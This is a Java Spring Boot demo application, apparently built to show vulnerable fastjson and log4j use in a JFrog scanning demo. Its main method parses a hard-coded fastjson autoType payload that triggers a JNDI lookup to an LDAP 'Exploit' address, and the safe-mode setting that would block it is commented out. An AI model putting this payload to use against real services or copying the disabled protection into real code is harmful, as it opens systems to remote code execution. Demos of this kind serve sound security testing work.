package com.example.jfrog.demo;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.TypeReference;
import com.alibaba.fastjson.parser.ParserConfig;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.web.bind.annotation.*;

import com.alibaba.fastjson.JSON;

import java.io.*;
import java.util.Map;


@RestController
@SpringBootApplication
public class DemoApplication {

	private static final Logger logger = LogManager.getLogger();

	@RequestMapping(value = "/helloTomcat")
	public String getHelloTomcat(){
		return "Hello Tomcat!";
	}

	@RequestMapping(value = "/helloJFrog")
	public String getHelloJFrog(){
		return "Hello JFrog China! How are you";
	}

	@GetMapping(value = "/userName/{name}")
	public String getUserName(@PathVariable String name){
		return "Hello" + name;
	}

	public static void main(String[] args) throws IOException {
       String payload = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://127.0.0.1:1389/Exploit\"}";

//		 ParserConfig.getGlobalInstance().setSafeMode(true);
		
		JSON jsonObject = JSON.parseObject(payload);

//		logger.info(jsonObject.toString());

        SpringApplication.run(DemoApplication.class, args);
	}

}
